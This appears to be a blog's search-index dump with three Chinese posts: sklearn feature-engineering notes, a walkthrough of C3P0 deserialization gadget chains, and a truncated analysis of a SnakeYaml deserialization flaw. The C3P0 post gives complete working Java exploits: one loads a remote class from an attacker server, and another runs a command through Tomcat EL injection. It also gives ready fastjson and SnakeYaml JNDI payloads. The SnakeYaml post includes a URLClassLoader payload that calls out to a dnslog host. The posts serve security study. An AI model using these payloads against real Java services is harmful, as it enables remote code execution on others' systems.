特征工程是指在机器学习任务中使用的数据预处理和特征处理技术，旨在提取、构建和选择对模型训练有用的特征，从而改善模型的性能。特征工程是机器学习中非常重要的一部分，它直接影响到模型的性能和泛化能力。\n\n包括特征提权，特征转化，特征降维\n\n## 数据集操作\n\n软件包\n\n- sklearn.datasets\n\n**加载获取数据集**：\n\n1. datasets.load_*()\n\n获取小规模数据集，默认在库中包含有\n\n1. datasets.fetch_*(data_home=None)\n\n获取大规模数据集，需要从网络上下载，函数的第一个参数表示数据集下载路径，默认是~/scikit_learn_data/\n\n示例\n\n```python\nimport sklearn.datasets\ndata=sklearn.datasets.load_iris()\n```\n\n**数据集对象**\n\nload和fatch返回的数据类型是datasets.base.Bunch(继承于字典)\n\n属性\n\n- data：特征数据数组，是二维numpy.ndarray数组\n- target：标签数组，是numpy.ndarray数组\n- DESCR: 数据描述\n- target_names: 标签名\n- feature_names: 特征名\n\n**数据集划分**\n\n一般使用20%~30%的数据用于测试\n\n- sklearn.model_selection.train_test_split(arrays,*options)\n\n1. x数据集的特征值\n2. y数据集的标签值\n3. test_size:测试集大小，为float，默认为0.25\n4. random_state：随机数种子\n\n返回值: 训练集特征值，测试集特征值，训练集目标值，测试集目标值\n\n```python\nimport sklearn.datasets\nfrom sklearn.model_selection import  train_test_split\niris=sklearn.datasets.load_iris()\nx_train,x_test,y_train,y_test=train_test_split(iris.data,iris.target,test_size=0.2,random_state=18)\n```\n\n## 特征提取\n\n概念：将任意数据（如文本或图像）转化为可用于机器学习的数字特征\n\n分类：\n\n- 字典特征提权（特征离散化）\n- 文本特征提取\n- 图像特征提权\n\n特征提取api\n\n```\nsklearn.feature_extraction\n```\n\n### 字典特征提取\n\n**类**：\n\nsklearn.feature_extraction.DictVectorizer(sparse=True,...)  --实例化转化器\n\n作用：对字典数据进行特征值化\n\n默认返回sparse矩阵，若返回正常矩阵，设置sparse=False\n\n（类别采用one-hot编码）\n\nsparse矩阵：将非零值按照位置（元组）表示出来\n\n转化为：\n\n矩阵    matrix   二维数组\n\n向量    vector   一维数组\n\n**类方法**：\n\n- fit_transform( X )\n\nX:字典或者字典的迭代器，返回sparse（稀疏）矩阵\n\n- inverse_transform(X)\n\nX:array或者sparse矩阵，返回值：转化之前的数据格式\n\n- get_feature_names_out(X)\n\nX:前面得到的特征矩阵,返回类别名称\n\n \n\n```python\nfrom sklearn.feature_extraction import DictVectorizer\ndata=[\n    {\"city\":\"北京\",\"temperature\":23},\n    {\"city\":\"上海\",\"temperature\":21},\n    {\"city\":\"广州\",\"temperature\":30},\n      ]\ndictVector=DictVectorizer(sparse=False)\nnew_data=dictVector.fit_transform(data)\nnames=dictVector.get_feature_names_out(new_data)\nprint(names)\nprint(new_data)\nprint(dictVector.inverse_transform(new_data))\n```\n\n应用场景：\n\n若数据集类别多，先将数据集转为字典，再进行特征提权\n\n### 文本特征提取\n\n1. **CountVectorizer**\n\n类：\n\nsklearn.feature_extraction.text.CountVectorizer(stop_words=[])\n\nstop_words:停用词，不纳入特征值的词\n\n方法同字典特征提取\n\ntoarray()--将结果对象转为二维数组\n\n将每条数据（句子）统计单词数\n\n英文\n\n```python\nfrom sklearn.feature_extraction.text import CountVectorizer\ndata=\"I like to have a book.I like go to like good college and eat beef.I am a student of computer science\".split(\".\")\ncount_vector = CountVectorizer()\nnew_data=count_vector.fit_transform(data)\nprint(new_data.toarray())\nprint(count_vector.get_feature_names_out(new_data))\n```\n\n中文需要进行词组间加空格\n\n使用第三方库：jieba.cut()\n\n1. **Tf-idf文本特征提权**\n\nTF-IDF的主要思想是：如果某个词或者短语在一篇文章中出现的概率高，并且在其他文章很少出现，则认为此词或者短语具有很好的区分能力，适合用来分类。\n\nTF-IDF作用： 用以评估一字词对于一个文件集或者一个语料库中其中一份文件的重要程度\n\n**公式**\n\n- 词频（term frequency, tf）：指的是某一个给定的词语在该文件中出现的频率\n- 逆向文档率（inverse document frequency,idf）：是一个词语普遍重要性的度量，\n\n某一个特定词语的idf,可以由总文件数目除以包含该词语之文件的数目，再将得到的商取以10为底的对数得到\n\n$$tfidf_(ij)=tf_(ij) X idf_i$$\n\n类：\n\nsklearn.feature_extraction.text.TfidfVectorizer\n\n## 特征转化\n\n数值型数据的无量纲化：\n\n- 归一化\n- 标准化\n\nAPI: \n\n```\nsklearn.preprocessing\n```\n\n需求：\n\n特征的单位或者大小相差较大，或者某特征的方差比其他特征要大出几个数量级，容易影响目标结果，使得一些算法无法学习到其它的特征\n\n### 归一化\n\n1. 定义：通过原始数据进行变换把数据映射到默认为（0,1）之间\n\n1. 公式：\n\n$$X'=\\frac{x-min}{max-min}$$\n\n$$X''=X'*(mx-mi)+mi$$\n\n> 作用于每一列，max为一列的最大值，min为一列最小值，那么X'为最终结果，mx,mi分别为指定区间,mx默认为1，mi默认为0\n\n1. 类：\n\nsklearn.preprocessing.MinMaxScaler(feature_range=(0,1)...)\n\n方法：\n\n- fit_transform(X) :返回处理后相同形状的数组\n\n```python\nimport sklearn.datasets as datasets\nfrom sklearn.preprocessing import MinMaxScaler\niris=datasets.load_iris()\n\ndef for_one():\n    scaler=MinMaxScaler()\n    new_data=scaler.fit_transform(iris.data)\n    print(new_data)\n```\n\n1. 特点\n\n最大值和最小值容易受到异常点影响，所以只适合传统精确小数据场景\n\n### 标准化\n\n1. 定义\n\n通过对原始数据进行变换把数据变换到均值为0，标准差为1范围内\n\n1. 公式\n\n$$X'=\\frac{x-mean}{\\sigma}$$\n\n> 作用于每一列，mean为平均值，$$\\sigma$$为标准差\n\n1. 类\n\nsklearn.preprocessing.StandardScaler()\n\n方法：\n\n- fit_transform(X) :返回处理后相同形状的数组\n\n1. 特点\n\n弥补了归一化缺陷\n\n减少了一异常值对结果的影响，适合于大数据场景\n\n## 特征降维\n\n定义：指在某些限定条件下，降低随机变量（特征）个数，得到一组“不相关”主要量的过程\n\n### 特征选择\n\n1. 定义\n\n数据包含冗余相关变量（或称特征、属性、指标等），旨在从原有特征中找出主要特征\n\n1. 方法\n\nFilter(过滤式)：主要探究特征本身特点、特征与特征和目标值之间关联\n\n- 方差选择法：低方差特征过滤\n- 相关系数\n\nEmbedded(嵌入式)：算法自动选择特征（特征与目标值之间的关联）\n\n- 决策树：信息熵、信息增益\n- 正则化：L1,L2\n- 深度学习：卷积等\n\n1. 模块\n\n```python\nsklearn.feature_selection\n```\n\n1. 过滤式\n\n**低方差特征过滤**\n\n> 删除低方差的一些特征\n\n类：sklearn.feature_selection.VarianceThreshold(threshold = 0.0)\n\n删除所有的低方差特征\n\n方法：\n\n- fit_transform(X)：\n\nX:numpy数组\n\n返回值：训练集差异低于threshold的特征将会被删除，默认是保持所有的特征，即方差非零特征，即删除所有样本中具有相同值的特征。\n\n```python\nimport sklearn.datasets as datasets\nfrom  sklearn.feature_selection import VarianceThreshold\niris=datasets.load_iris()\ndef low_std():\n    select=VarianceThreshold(threshold=0.5)\n    new_data = select.fit_transform(iris.data)\n    print(new_data)\n```\n\n**相关系数**\n\n皮尔逊相关系数\n\n1. 公式\n\n$$r= cov(X, Y) / (σ(X) * σ(Y))=\\frac{\\sum((X_i - \\bar{X}) * (Y_i - \\bar{Y}))}{\\sqrt{\\sum(X_i - \\bar{X})^2 * \\sum(Y_i - \\bar{Y})^2}}$$\n\n1. 特点\n\n- r>0,正相关，r<0,负相关，|r|<=1\n- r=1时，两个变量完全相关，r=0时，两变量无相关关系\n- |r|<0.4为低相关度，0.4<=|r|<0.7为显著性相关，|r|>=0.7为高度线性相关\n\n1. 类\n\nscipy.stats.pearsonr(x,y)\n\nX,Y为数组\n\n返回值中的statistic属性为相关系数，pvalue属性为p 值（表示观察到的统计量在零假设成立的情况下（即两个变量之间没有线性关系）出现的概率）\n\n```python\nr=pearsonr(iris.data[:,0],iris.data[:,1])\nprint(r)\n```\n\n### 主成分分析\n\n（PCA）\n\n1. **定义**：高维度数据转化为低维度数据的过程，在此过程中可能会舍弃原有数据，创建新的变量\n2. **作用**：是数据维数压缩，尽可能降低原数据的维度（复杂度），损失少量信息\n3. **应用**：回归分析或者聚类分析当中\n\n1. 类\n\nsklearn.decomposition.PCA(n_components=None)\n\n- 将数据分解为较低维数空间\n- n_components\n  - float数据:表示保留百分比\n  - int数据：减少到多少特征\n\nfit_transform(X)","tags":["机器学习","sklearn","特征工程","数据处理"]},{"title":"C3P0链","url":"/2024/02/24/C3P0链/","content":"\n\n\n\n\n\n\n\n\n参考：[Java安全学习——C3P0链 - 枫のBlog](https://goodapple.top/archives/1749)\n\n<a name=\"BScjw\"></a>\n# C3P0介绍\n```text\nC3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。\n```\n\nJDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br />使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。<br />连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。\n\n<br />\n<a name=\"vDNj8\"></a>\n# Gadget\n> 导入依赖\n\n```xml\n<dependency>\n  <groupId>com.mchange</groupId>\n  <artifactId>c3p0</artifactId>\n  <version>0.9.5.2</version>\n</dependency>\n```\n\n\nC3P0常见的利用方式有如下三种\n\n- URLClassLoader远程类加载\n- JNDI注入\n- 利用HEX序列化字节加载器进行反序列化攻击\n\n<a name=\"wEy7I\"></a>\n## URLClassLoader远程类加载\n<a name=\"Gy11c\"></a>\n##### 过程\n流程：PoolBackedDataSourceBase#readObject ->ReferenceSerialized#getObject ->ReferenceableUtils#referenceToObject ->ObjectFactory#getObjectInstance\n\n入口类：PoolBackedDataSourceBase<br />PoolBackedDataSourceBase#readObject<br />!<img src=\"/img/2-24/1.png\" >\n\n如果反序列化得到的类是IndirectlySerialized的实例，则会调用其getObject()方法，然后将返回的类转为ConnectionPoolDataSource类\n\nIndirectlySerialized是一个接口，查找实现类，找到ReferenceSerialized类<br />!<img src=\"/img/2-24/2.png\" ><br />在这里发现存在lookup方法，那么肯能这点就存在jndi注入，好吧但实际上在反序列化时我们是无法调用到该方法的，因为属性contextName为默认null且不可控<br />继续进入ReferenceableUtils#referenceToObject<br />这里reference我们放在后面EXP部分，怎么控制<br />!<img src=\"/img/2-24/3.png\" ><br />从第一个参数Reference ref获取URL,并使用URLClassLoader获取class类<br />forName进行类加载<br />newInstance实例。恶意类静态代码块和构造函数会被执行\n\n<a name=\"MLhzx\"></a>\n##### EXP编写\n\n由于入口类writeObject的是connectionPoolDataSource属性，connectionPoolDataSource是一个接口没有继承Serializable接口（EXP就得实现这个接口才行），无法被直接序列化，因此走的是catch分支\n\n!<img src=\"/img/2-24/4.png\" ><br />可以看到使用包装类包装了这个类。发现是一个接口的方法。<br />找到唯一的实现类ReferenceIndirector，<br />!<img src=\"/img/2-24/5.png\" ><br />调用Referenceable接口的getReference方法，那么我们的EXP就该实现这个接口，并返回我们恶意的Reference对象。\n\n然后继续看ReferenceSerialized<br />!<img src=\"/img/2-24/6.png\" ><br />这里就赋值了上面Gadget最后要用的reference<br />!<img src=\"/img/2-24/7.png\" ><br />最后EXP\n```java\npackage C3P0;\n\nimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;\n\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport javax.naming.Referenceable;\nimport javax.sql.ConnectionPoolDataSource;\nimport javax.sql.PooledConnection;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.logging.Logger;\n\npublic class C3P0_URLClassLoader {\n\n    public static class EXP_Loader implements ConnectionPoolDataSource, Referenceable{\n\n        @Override\n        public Reference getReference() throws NamingException {\n            return new Reference(\"ExpClass\",\"exp\",\"http://127.0.0.1:8888/\");\n        }\n\n        @Override\n        public PooledConnection getPooledConnection() throws SQLException {\n            return null;\n        }\n\n        @Override\n        public PooledConnection getPooledConnection(String user, String password) throws SQLException {\n            return null;\n        }\n\n        @Override\n        public PrintWriter getLogWriter() throws SQLException {\n            return null;\n        }\n\n        @Override\n        public void setLogWriter(PrintWriter out) throws SQLException {\n\n        }\n\n        @Override\n        public void setLoginTimeout(int seconds) throws SQLException {\n\n        }\n\n        @Override\n        public int getLoginTimeout() throws SQLException {\n            return 0;\n        }\n\n        @Override\n        public Logger getParentLogger() throws SQLFeatureNotSupportedException {\n            return null;\n        }\n    }\n\n    //序列化\n    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {\n        //反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类\n        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);\n        Class cls = poolBackedDataSourceBase.getClass();\n        Field field = cls.getDeclaredField(\"connectionPoolDataSource\");\n        field.setAccessible(true);\n        field.set(poolBackedDataSourceBase,c);\n\n        //序列化流写入文件\n        FileOutputStream fos = new FileOutputStream(new File(\"exp.bin\"));\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(poolBackedDataSourceBase);\n\n    }\n\n    //反序列化\n    public static void Pool_Deserial() throws IOException, ClassNotFoundException {\n        FileInputStream fis = new FileInputStream(new File(\"exp.bin\"));\n        ObjectInputStream objectInputStream = new ObjectInputStream(fis);\n        objectInputStream.readObject();\n    }\n\n    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {\n        EXP_Loader exp_loader = new EXP_Loader();\n        Pool_Serial(exp_loader);\n        Pool_Deserial();\n    }\n\n}\n```\nURL所在目录下必须有包名的目录\n<a name=\"T9sRB\"></a>\n## JNDI注入\n这条链子依赖于fastjson或者Jackson、snakeyaml等反序列化漏洞,利用的是getter和setter方法\n<a name=\"CQJNO\"></a>\n### 过程\n流程\n```java\n#修改jndiName\nJndiRefConnectionPoolDataSource#setJndiName ->\nJndiRefForwardingDataSource#setJndiName\n \n#JNDI调用\nJndiRefConnectionPoolDataSource#setLoginTime ->\nWrapperConnectionPoolDataSource#setLoginTime ->\nJndiRefForwardingDataSource#setLoginTimeout ->\nJndiRefForwardingDataSource#inner ->\nJndiRefForwardingDataSource#dereference() ->\nContext#lookup\n```\nJndiRefConnectionPoolDataSource#setLoginTimeout<br />!<img src=\"/img/2-24/8.png\" ><br />wcps是WrapperConnectionPoolDataSource类<br />!<img src=\"/img/2-24/9.png\" ><br />继续进入<br />!<img src=\"/img/2-24/10.png\" ><br />调式发现getNestedDataSource()返回的是JndiRefForwardingDataSource对象<br />!<img src=\"/img/2-24/11.png\" ><br />找到setLoginTimeout方法<br />!<img src=\"/img/2-24/12.png\" ><br />进入inner方法\n\n!<img src=\"/img/2-24/13.png\" ><br />继续进入dereference方法<br />!<img src=\"/img/2-24/14.png\" ><br />最后在这里创建initialContext，并使用危险方法lookup。（到这里就有jndi注入了）<br />只需能控制jndiName就能够进行jndi注入\n\n继续查看是否可控jndiName\n\nJndiRefConnectionPoolDataSource#setJndiName\n\n!<img src=\"/img/2-24/15.png\" ><br />jrfds为JndiRefForwardingDataSource对象，刚好跟上文对应<br />这里调用的是父类的setJndiName<br />进入JndiRefDataSourceBase#setJndiName<br />!<img src=\"/img/2-24/16.png\" ><br />这里对上面的jndiName赋值\n\n<a name=\"IbZOd\"></a>\n### EXP\n\n<a name=\"X3Ocj\"></a>\n##### **普通exp**\n```java\nJndiRefConnectionPoolDataSource jndiRefConnectionPoolDataSource = new JndiRefConnectionPoolDataSource();\n\t\ttry {\n\t\t\tjndiRefConnectionPoolDataSource.setJndiName(\"rmi://127.0.0.1:8085/RFKMphyY\");\n\t\t\tjndiRefConnectionPoolDataSource.setLoginTimeout(2);\n\t\t} catch (SQLException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t} catch (PropertyVetoException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n```\n思路：jndiRefConnectionPoolDataSource#setJndiName设置jndi的路径，<br />jndiRefConnectionPoolDataSource#setLoginTimeout触发jndi注入\n\n<a name=\"L2FPH\"></a>\n##### **fastjson版**\n```json\n{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\",\"jndiName\":\"rmi://127.0.0.1:8085/RFKMphyY\",\"loginTimeout\":2}\n```\n\n<a name=\"wmUlk\"></a>\n##### **SnakeYaml版**\n```yaml\n!!com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource {jndiName: \"rmi://127.0.0.1:8085/RFKMphyY\", loginTimeout: \"2\"}\n```\n注意空格(踩过坑)\n\n<a name=\"nEs1R\"></a>\n## HEX二次反序列化\n\n<a name=\"X8Z6c\"></a>\n### 过程\n\n流程\n```yaml\n#设置userOverridesAsString属性值\nWrapperConnectionPoolDataSource#setuserOverridesAsString ->\nWrapperConnectionPoolDataSourceBase#setUserOverridesAsString\n \n#初始化类时反序列化十六进制字节流\nWrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource ->\nC3P0ImplUtils#parseUserOverridesAsString ->\nSerializableUtils#fromByteArray ->\nSerializableUtils#deserializeFromByteArray ->\nObjectInputStream#readObject\n```\n\nWrapperConnectionPoolDataSource#setuserOverridesAsString<br />调用父类方法，WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br />!<img src=\"/img/2-24/17.png\" ><br />会获取原来的值和新的值放入另一个方法中<br />进入VetoableChangeSupport#fireVetoableChange<br />继续进入重载方法<br />!<img src=\"/img/2-24/18.png\" ><br />然后调用所有listener的vetoableChange方法<br />!<img src=\"/img/2-24/19.png\" ><br />当前有一个listener就是WrapperConnectionPoolDataSource<br />进入WrapperConnectionPoolDataSource#vetoableChange<br />!<img src=\"/img/2-24/20.png\" ><br />然后调到这里<br />!<img src=\"/img/2-24/21.png\" ><br />val就是我们设置的属性值<br />进入C3P0ImplUtils#parseUserOverridesAsString<br />!<img src=\"/img/2-24/22.png\" ><br />这里会从默认前缀HexAsciiSerializedMap加上一个字符后开始截取真正的反序列化数据（那么payload就应该加上这个前缀）<br />然后将字符串转为字符数组\n\n\n进入SerializableUtils#fromByteArray<br />!<img src=\"/img/2-24/23.png\" ><br />进入deserializeFromByteArray<br />!<img src=\"/img/2-24/24.png\" ><br />这里就是一个链子结尾，触发了原生的反序列化，readObject，也算是反序列链子的一个入口点，因此可以用这个来进行二次反序列化\n\n\n<a name=\"cBnw1\"></a>\n# C3P0不出网利用\n不论是URLClassLoader加载远程类，还是JNDI注入，都需要目标机器能够出网。而加载Hex字符串的方式虽然不用出网，但却有Fastjson等的相关依赖。那么如果目标机器不出网，又没有Fastjson依赖的话，C3P0链又该如何利用呢<br />在JNDI高版本利用中，我们可以加载本地的Factory类进行攻击，而利用条件之一就是该工厂类至少存在一个getObjectInstance()方法。比如通过加载Tomcat8中的org.apache.naming.factory.BeanFactory进行EL表达式注入<br />!<img src=\"/img/2-24/25.png\" ><br />我们再回头看C3P0中利用URLClassLoader进行任意类加载的攻击方式<br />!<img src=\"/img/2-24/26.png\" ><br />在实例化完我们的恶意类之后，调用了恶意类ObjectFactory.getObjectInstance()。由于可以实例化任意类，所以我们可以将该类设置为本地的BeanFactory类。在不出网的条件下可以进行EL表达式注入，利用方式类似JNDI的高版本绕过。当然了，这种利用方式需要存在Tomcat8相关依赖环境\n<a name=\"HSnur\"></a>\n### 利用链构造\n由于BeanFactory中需要Reference为ResourceRef类，因此在getReference()中我们实例化ResourceRef类，剩下的构造就和高版本JNDI类似了\n\n```yaml\npackage C3P0;\n \nimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;\nimport org.apache.naming.ResourceRef;\n \nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport javax.naming.Referenceable;\nimport javax.naming.StringRefAddr;\nimport javax.sql.ConnectionPoolDataSource;\nimport javax.sql.PooledConnection;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.logging.Logger;\n \npublic class C3P0_Tomcat8 {\n \n    public static class Tomcat8_Loader implements ConnectionPoolDataSource, Referenceable {\n \n        @Override\n        public Reference getReference() throws NamingException {\n            ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String)null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String)null);\n            resourceRef.add(new StringRefAddr(\"forceString\", \"faster=eval\"));\n            resourceRef.add(new StringRefAddr(\"faster\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"));\n            return resourceRef;\n        }\n \n        @Override\n        public PooledConnection getPooledConnection() throws SQLException {\n            return null;\n        }\n \n        @Override\n        public PooledConnection getPooledConnection(String user, String password) throws SQLException {\n            return null;\n        }\n \n        @Override\n        public PrintWriter getLogWriter() throws SQLException {\n            return null;\n        }\n \n        @Override\n        public void setLogWriter(PrintWriter out) throws SQLException {\n \n        }\n \n        @Override\n        public void setLoginTimeout(int seconds) throws SQLException {\n \n        }\n \n        @Override\n        public int getLoginTimeout() throws SQLException {\n            return 0;\n        }\n \n        @Override\n        public Logger getParentLogger() throws SQLFeatureNotSupportedException {\n            return null;\n        }\n    }\n \n    //序列化\n    public static void Pool_Serial(ConnectionPoolDataSource c) throws NoSuchFieldException, IllegalAccessException, IOException {\n        //反射修改connectionPoolDataSource属性值\n        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);\n        Class cls = poolBackedDataSourceBase.getClass();\n        Field field = cls.getDeclaredField(\"connectionPoolDataSource\");\n        field.setAccessible(true);\n        field.set(poolBackedDataSourceBase,c);\n \n        //序列化流写入文件\n        FileOutputStream fos = new FileOutputStream(new File(\"exp.bin\"));\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(poolBackedDataSourceBase);\n \n    }\n \n    //反序列化\n    public static void Pool_Deserial() throws IOException, ClassNotFoundException {\n        FileInputStream fis = new FileInputStream(new File(\"exp.bin\"));\n        ObjectInputStream objectInputStream = new ObjectInputStream(fis);\n        objectInputStream.readObject();\n    }\n \n    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {\n        Tomcat8_Loader tomcat8_loader = new Tomcat8_Loader();\n        Pool_Serial(tomcat8_loader);\n        Pool_Deserial();\n    }\n}\n```\n注意，由于Tomcat8的EL依赖可能不完整，利用的时候可能会失败，最好依赖下面两个包\n```yaml\n<dependency>\n    <groupId>org.apache.tomcat</groupId>\n    <artifactId>tomcat-catalina</artifactId>\n    <version>8.5.0</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.tomcat.embed</groupId>\n    <artifactId>tomcat-embed-el</artifactId>\n    <version>8.5.15</version>\n</dependency>\n```\n","tags":["web安全","java安全","反序列化"],"categories":["java安全"]},{"title":"SnakeYaml反序列化漏洞","url":"/2024/01/22/SnakeYaml反序列化漏洞/","content":"\n\n\n\n\n\n\n# SnakeYaml反序列化漏洞\n\n​\tSnakeYaml 是java解析yaml格式的组件库，将yaml格式的数据转为java对象称为反序列化，反过来就是序列化。\n\n\n\n漏洞版本： 1.xx\n\n\n<a name=\"A4pSC\"></a>\n## Yaml介绍\n**特性**：\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进不允许使用tab，只允许空格\n- 缩进的空格数不重要，只要相同层级的元素左对齐即可\n- '#'表示注释\n\nYAML 支持以下几种数据类型：\n\n- 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）\n- 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n- 纯量（scalars）：单个的、不可再分的值，就是一些基本数据类型\n\nSnakeYaml 解析的时候看到的数据类型名字是mapping（映射）,sequence（序列）,scalars（纯量），而不是对象和数组\n\n\n在数据前添加   !!全类名 。表示强制转化数据类型。类似于fastjson中的 @type\n\n\n<a name=\"tgSBe\"></a>\n## SnakeYaml使用\n导入依赖，springboot项目中自带依赖\n```xml\n<dependency>\n  <groupId>org.yaml</groupId>\n  <artifactId>snakeyaml</artifactId>\n  <version>1.27</version>\n</dependency>\n\n```\n\n首先要new Yaml()<br />再用load,loads,dump,dumps(跟pickle序列化和反序列化一样)\n\n示例\n```java\ninputStream = new FileInputStream(filepath);\nyaml = new Yaml();\n// 使用文件输入流读取YAML文件\nyamlMap = yaml.load(inputStream);\n```\n\n\n<a name=\"nwcZ9\"></a>\n## 反序列化漏洞原理\n\n<a name=\"MdNuR\"></a>\n### 原理\n!!+全类名指定反序列化的类，反序列化过程中会实例化该类。snakeyaml 将全类名解析，并将类使用forname()进行加载，然后通过反射获取构造器，调用构造方法，控制适当的类的构造方法就能进行漏洞攻击\n\n<a name=\"nwg1g\"></a>\n### 解析过程\n下面是一些调试过程，方便理解是如何进解析的，可能大部分内容对于我们的漏洞毫无关系<br />\n\n\n\n\n\n！！！ 值得注意的是这里调式的数据类型是数组，其他数据稍有不同\n\n#### sequence类型反序列化过程调试代码:\n\n```java\npublic static void main(String[] args) {\n\t\tString context = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://7c6yh7.dnslog.cn\\\"]]]]\\n\";\n\t\tYaml yaml = new Yaml();\n\t\tyaml.load(context);\n\t}\n```\n\n\nnew Yaml()初始化：大概就是初始化一些构造器，和一些解析规则\n\nload的过程：\n\n<a name=\"l5INl\"></a>\n##### 1.初始化部分：\n根据输入创建流，和传入Object.class，表示返回一个Object<br /><img src=\"/img/1-22/1.png\"><br />\n\n\n\n进入loadFromReader\n\n<img src=\"/img/1-22/21.png\">\n\n在ParserImpl中对sreader做了相关的处理映射；追进去看一下；利用重载拿到相关映射；\n\n<img src=\"/img/1-22/22.png\">\n\n\n\n然后new Composer加载默认配置并解析开头和结尾的位置\n\n<a name=\"mE9Al\"></a>\n##### 2.解析节点\n然后getSingleNode()将整个yaml数据解析成多个节点，，注意的是在解析节点过程中composeNode方法和composeSequenceNode方法（数据是Sequence类型）相互调用形成递归，这样就递归解析到每个节点。\n\n最终解析完多重嵌套的数据\n\n<img src=\"/img/1-22/2.png\"><br />然后每一个节点的类型，或者是全类名加上默认的前缀，就是一个tag<br /><img src=\"/img/1-22/3.png\">\n\n然后进入constructDocument方法，再进入constructObject方法。这是因为yaml数据可能是多个部分\n\nconstructObject中会判断是否已经被解析，即在缓存hashmap是否已存在，然后继续构造\n\n<a name=\"cd4ML\"></a>\n##### 3.获取构造器和进行类加载\n> 这里的构造器是SnakeYaml中设置的构造器，而不是我们设置的类构造器\n\n构造器初始化：\n\ngetConstructor从节点node中获取构造器,首先会从yamlConstructors中获取构造器（new Yaml时候创建的），yamlConstructors里面是yaml中13中数据类型对应的构造器<br /><img src=\"/img/1-22/4.png\"><br />很显然我们最外层的javax.script.ScriptEngineManager并不是基本的数据类型，就是返回默认的构造器，就是上面13个里面的null类型\n\n然后是再检查缓存中是否有构造器，很显然是没有的，进入construct方法<br /><img src=\"/img/1-22/5.png\"><br />有时候挺想吐槽，<br />再次调用getConstructor方法和construct方法。只不过这次getConstructor方法是Constructor类中的方法，跟上面的不同（BaseConstructor,细品）\n\n在这个getConstructor方法中，他进行了类加载，并且重新设置了type<br /><img src=\"/img/1-22/6.png\">\n\n类加载：<br />从tag中去除前缀，拿到全类名，进入forName进行类加载，这里类加载进行了初始化，那么被加载的类中的静态代码块可以执行。从主线程拿到应用加载器进行加<img src=\"/img/1-22/7.png\">\n\n最终还是从yamlClassConstructors中拿到的构造器。也就是Sequenced的构造器<br /><img src=\"/img/1-22/8.png\">\n\n\n<a name=\"ufLhq\"></a>\n##### 4.反射构造\n进入Sequence构造器的construct方法中。首先会获取类构造器<br /><img src=\"/img/1-22/9.png\"><br />上面代码获取构造方法的大致流程：\n\n1. 获取全面的类构造器\n2. 循环遍历，拿到参数个数与node节点value个数相同的类构造方法（这里我们有一个元素的嵌套，相当于是有一个参数）\n3. 获取那些构造方法的参数类型与node的value同类型的构造方法 （参数类型是ClassLoader类加载器，刚好里面一层是URLClassLoader类加载器）\n4. 如果满足条件的有多个构造器，取第一个\n\n根据我们的payload。会拿到这个方法。<br /><img src=\"/img/1-22/10.png\">\n\n\n上面过程中会对node的value递归调用constructorObject方法（最开始还没找到是这里递归了），这样就把payload从最里面的字符串构造出来后再回到上一层构造方法中。把参数列表构造出来了。\n\n当不是递归时或者是最里层，会通过反射newInstance实例对象<br /><img src=\"/img/1-22/11.png\">\n\n上面过程可以看出SnakeYaml中会经常有递归。\n\n\n上面最后调用的方法ScriptEngineManager(ClassLoader loader)涉及java中的SPI机制\n\n<a name=\"syXDk\"></a>\n\n\n\n\n\n\n\n#### **mapping类型反****序列化****过程**\n\nmapping数据类型对应javaBean对象，大致跟上面相同，不同的是会同fastjson一样会调用setter方法。\n\n调式过程就省略了,攻击链可以参考fastjson的\n\n可以参考这位师傅的文章：[Java SnakeYaml反序列化漏洞 | s1mple](https://s1mple-top.github.io/2022/03/26/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)\n\n## SPI机制\n> SPI机制在其中的一条攻击链中利用到\n\n\n<a name=\"fVNWU\"></a>\n### 介绍\nSPI（Service Provider Interface），是JDK内置的一种 